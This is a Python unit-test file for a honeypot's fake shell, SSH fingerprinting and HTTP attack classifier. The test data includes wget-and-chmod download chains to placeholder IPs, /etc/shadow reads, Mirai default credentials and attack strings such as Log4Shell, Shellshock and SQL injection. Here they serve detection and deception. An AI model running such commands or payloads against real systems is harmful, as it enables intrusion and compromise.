"""Unit tests for the honeypot service layer.

These test the pure, parse-and-classify parts of each service — the code paths
that run against hostile input — without opening sockets. The socket plumbing in
``base.py`` is covered by the integration test, which drives a real listener.
"""

from __future__ import annotations

import pytest

from honeypot.deception.banners import get_persona, list_personas
from honeypot.deception.responses import FakeShell, http_response_for
from honeypot.services.http_service import (
    ATTACK_PATTERNS,
    HTTPService,
    ParsedRequest,
    _extract_credentials,
    _safe_headers,
)
from honeypot.services.ssh_service import (
    classify_banner,
    hassh_fingerprint,
    parse_kexinit,
)
from honeypot.services.telnet_service import IOT_DEFAULT_CREDS, strip_telnet_control

# --------------------------------------------------------------------------- #
# Deception layer
# --------------------------------------------------------------------------- #


class TestFakeShell:
    def test_never_executes_unknown_command(self):
        shell = FakeShell(get_persona("ubuntu-generic"), "host")
        assert (
            shell.run("definitely-not-a-real-binary")
            == "-bash: definitely-not-a-real-binary: command not found"
        )

    def test_whoami_matches_session_user(self):
        shell = FakeShell(get_persona(), "host", username="deploy")
        assert shell.run("whoami") == "deploy"

    def test_cd_updates_prompt(self):
        shell = FakeShell(get_persona(), "srv-1")
        shell.run("cd /var/www")
        assert shell.cwd == "/var/www"
        assert "/var/www" in shell.prompt

    def test_cd_into_nonexistent_dir_fails(self):
        shell = FakeShell(get_persona(), "host")
        out = shell.run("cd /no/such/place")
        assert "No such file or directory" in out
        assert shell.cwd == "/root"

    def test_shadow_read_is_denied_not_served(self):
        shell = FakeShell(get_persona(), "host")
        assert "Permission denied" in shell.run("cat /etc/shadow")

    def test_passwd_file_is_served(self):
        shell = FakeShell(get_persona(), "host")
        out = shell.run("cat /etc/passwd")
        assert "root:x:0:0" in out

    def test_download_records_url_but_does_not_fetch(self):
        shell = FakeShell(get_persona(), "host")
        out = shell.run("wget http://198.51.100.9/x.sh")
        assert "http://198.51.100.9/x.sh" in shell.download_attempts
        # The fake transcript must report a failure, never a success.
        assert "unable to resolve" in out.lower() or "unreachable" in out.lower()

    def test_command_chain_only_runs_head(self):
        shell = FakeShell(get_persona(), "host")
        # A chained command should be acknowledged, and the URL still captured.
        shell.run("cd /tmp && wget http://198.18.0.5/m -O x && chmod +x x")
        assert shell.cwd == "/tmp"

    def test_exit_signals_disconnect(self):
        shell = FakeShell(get_persona(), "host")
        assert shell.run("exit") == "__EXIT__"

    @pytest.mark.parametrize("persona_key", [p["key"] for p in list_personas()])
    def test_every_persona_has_consistent_prompt(self, persona_key):
        shell = FakeShell(get_persona(persona_key), "host")
        assert shell.prompt  # non-empty, formats without error


class TestPersona:
    def test_unknown_persona_falls_back_not_raises(self):
        # A typo in HONEYPOT_PERSONA must degrade, not crash the sensor.
        assert get_persona("does-not-exist").key == "ubuntu-generic"

    def test_none_returns_default(self):
        assert get_persona(None).key == "ubuntu-generic"


# --------------------------------------------------------------------------- #
# Telnet
# --------------------------------------------------------------------------- #


class TestTelnetControlStripping:
    def test_strips_iac_negotiation(self):
        # IAC DO ECHO (255 253 1) wrapping the text "root".
        raw = bytes([255, 253, 1]) + b"root" + bytes([255, 251, 3])
        assert strip_telnet_control(raw) == b"root"

    def test_preserves_plain_text(self):
        assert strip_telnet_control(b"admin") == b"admin"

    def test_escaped_ff_becomes_literal(self):
        assert strip_telnet_control(bytes([255, 255])) == bytes([255])

    def test_handles_subnegotiation(self):
        raw = b"ab" + bytes([255, 250, 24, 1, 2, 255, 240]) + b"cd"
        assert strip_telnet_control(raw) == b"abcd"

    def test_truncated_iac_at_end_is_dropped(self):
        assert strip_telnet_control(b"user" + bytes([255])) == b"user"

    def test_known_mirai_creds_present(self):
        # A regression guard: these drive the iot-default-credential tag.
        assert ("root", "xc3511") in IOT_DEFAULT_CREDS
        assert ("admin", "admin") in IOT_DEFAULT_CREDS


# --------------------------------------------------------------------------- #
# SSH fingerprinting
# --------------------------------------------------------------------------- #


class TestSSHFingerprint:
    def _kexinit(self) -> bytes:
        import struct

        lists = [
            b"curve25519-sha256,ecdh-sha2-nistp256",
            b"ssh-ed25519",
            b"aes128-ctr,aes256-ctr",
            b"aes128-ctr,aes256-ctr",
            b"hmac-sha2-256",
            b"hmac-sha2-256",
            b"none",
            b"none",
            b"",
            b"",
        ]
        payload = bytes([20]) + b"\x00" * 16
        for entry in lists:
            payload += struct.pack(">I", len(entry)) + entry
        payload += b"\x00" + struct.pack(">I", 0)
        return payload

    def test_parses_all_ten_namelists(self):
        parsed = parse_kexinit(self._kexinit())
        assert parsed is not None
        assert parsed["kex_algorithms"] == ["curve25519-sha256", "ecdh-sha2-nistp256"]
        assert parsed["encryption_algorithms_client_to_server"] == ["aes128-ctr", "aes256-ctr"]

    def test_rejects_wrong_message_type(self):
        assert parse_kexinit(bytes([21]) + b"\x00" * 20) is None

    def test_rejects_truncated_payload(self):
        # A length field that claims more bytes than exist must not over-read.
        import struct

        malicious = bytes([20]) + b"\x00" * 16 + struct.pack(">I", 9999) + b"short"
        assert parse_kexinit(malicious) is None

    def test_hassh_is_stable(self):
        parsed = parse_kexinit(self._kexinit())
        digest1, algs1 = hassh_fingerprint(parsed)
        digest2, algs2 = hassh_fingerprint(parsed)
        assert digest1 == digest2
        assert len(digest1) == 32  # md5 hex
        assert algs1 == algs2

    def test_hassh_differs_for_different_clients(self):
        import struct

        parsed_a = parse_kexinit(self._kexinit())

        def other():
            lists = [
                b"diffie-hellman-group14-sha1",
                b"ssh-rsa",
                b"3des-cbc",
                b"3des-cbc",
                b"hmac-md5",
                b"hmac-md5",
                b"none",
                b"none",
                b"",
                b"",
            ]
            payload = bytes([20]) + b"\x00" * 16
            for entry in lists:
                payload += struct.pack(">I", len(entry)) + entry
            return payload + b"\x00" + struct.pack(">I", 0)

        parsed_b = parse_kexinit(other())
        assert hassh_fingerprint(parsed_a)[0] != hassh_fingerprint(parsed_b)[0]

    def test_classify_banner_flags_scanners(self):
        assert any("libssh" in t for t in classify_banner("SSH-2.0-libssh2_1.10.0"))
        assert "malformed-banner" in classify_banner("garbage")
        assert classify_banner("SSH-2.0-OpenSSH_8.9") == []


# --------------------------------------------------------------------------- #
# HTTP parsing and classification
# --------------------------------------------------------------------------- #


def _http_service() -> HTTPService:
    from honeypot.config import Settings
    from honeypot.logger import EventLogger
    from honeypot.session import SessionRegistry

    settings = Settings()
    settings.write_to_db = False
    settings.jsonl_path = None
    logger = EventLogger(settings)
    return HTTPService(settings, logger, SessionRegistry(settings), port=8081)


class TestHTTPClassification:
    @pytest.mark.parametrize(
        "sample,expected_tag",
        [
            ("${jndi:ldap://x/a}", "log4shell"),
            ("/../../../../etc/passwd", "path-traversal"),
            ("/?q=1' OR '1'='1", "sql-injection"),
            ("/?x=1 UNION SELECT a,b FROM t", "sql-injection"),
            ("() { :; }; /bin/id", "shellshock"),
            ("/upload/shell.php", "webshell-upload"),
            ("/.env", "env-file-probe"),
            ("/.git/config", "env-file-probe"),
            ("/cgi-bin/x.cgi", "cgi-probe"),
            ("/wp-login.php", "admin-probe"),
        ],
    )
    def test_pattern_matches(self, sample, expected_tag):
        matched = [tag for tag, _sev, pat in ATTACK_PATTERNS if pat.search(sample)]
        assert expected_tag in matched

    def test_benign_path_matches_nothing_serious(self):
        matched = [tag for tag, _sev, pat in ATTACK_PATTERNS if pat.search("/index.html")]
        assert "log4shell" not in matched
        assert "sql-injection" not in matched

    def test_response_for_bait_path(self):
        status, ctype, body = http_response_for("/.env", get_persona(), "host")
        assert status == 200
        assert "DB_PASSWORD" in body  # decoy secret, not a real one

    def test_response_for_unknown_path_is_404(self):
        status, _, body = http_response_for("/nope-not-here", get_persona(), "host")
        assert status == 404


class TestCredentialExtraction:
    def test_basic_auth_header(self):
        import base64

        request = ParsedRequest()
        token = base64.b64encode(b"admin:secret").decode()
        request.headers = {"authorization": f"Basic {token}"}
        user, pw = _extract_credentials(request, "")
        assert user == "admin"
        assert pw == "secret"

    def test_form_post(self):
        request = ParsedRequest()
        user, pw = _extract_credentials(request, "username=root&password=toor")
        assert user == "root"
        assert pw == "toor"

    def test_no_credentials(self):
        request = ParsedRequest()
        assert _extract_credentials(request, "just=data") == (None, None)

    def test_malformed_basic_auth_is_ignored(self):
        request = ParsedRequest()
        request.headers = {"authorization": "Basic !!!not-base64!!!"}
        assert _extract_credentials(request, "") == (None, None)


def test_safe_headers_truncates():
    huge = {"x-big": "A" * 5000, "normal": "ok"}
    safe = _safe_headers(huge)
    assert len(safe["x-big"]) <= 1024
    assert safe["normal"] == "ok"
